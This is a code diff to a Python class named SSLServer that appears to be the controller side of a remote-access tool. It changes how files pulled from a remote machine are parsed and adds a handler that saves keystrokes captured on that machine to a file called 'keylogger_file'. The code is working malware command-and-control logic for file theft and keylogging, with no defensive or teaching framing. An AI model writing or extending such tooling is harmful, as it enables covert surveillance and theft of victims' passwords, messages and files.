@@ -107,17 +107,19 @@ class SSLServer:
 
             lines = response.split("\n")
 
-            if lines[0] != "OK":
+            if lines[0] != "DOWNLOAD":
                 print(response)
-
                 return
 
-            content = "\n".join(lines[1:-1])
+            if lines[1] != "OK":
+                print("\n".join(lines[1:]))
+                return
+
+            content = "\n".join(lines[2:])
 
             filename = "downloaded_file"
 
             with open(filename, "w") as f:
-
                 f.write(content)
 
             print(f"File saved: {filename}")
@@ -125,6 +127,33 @@ class SSLServer:
         except Exception as e:
 
             print("Download save error:", e)
+
+    def _save_keylog(self, response):
+
+        try:
+
+            lines = response.split("\n")
+
+            if lines[1] != "OK":
+                print(response)
+                return
+
+            content = "\n".join(lines[2:])
+
+            if not content:
+                print("No keystrokes captured")
+                return
+
+            filename = "keylogger_file"
+
+            with open(filename, "w") as f:
+                f.write(content)
+
+            print(f"Keylogger saved: {filename}")
+
+        except Exception as e:
+
+            print("Keylogger save error:", e)
 
     def _recv_until_eof(self, sock):
 
@@ -168,9 +197,17 @@ class SSLServer:
 
                     break
 
-                if response.startswith("OK\n"):
+                lines = response.split("\n")
+
+                response_type = lines[0]
+
+                if response_type == "DOWNLOAD":
 
                     self._save_download(response)
+
+                elif response_type == "KEYLOG":
+
+                    self._save_keylog(response)
 
                 else:
 
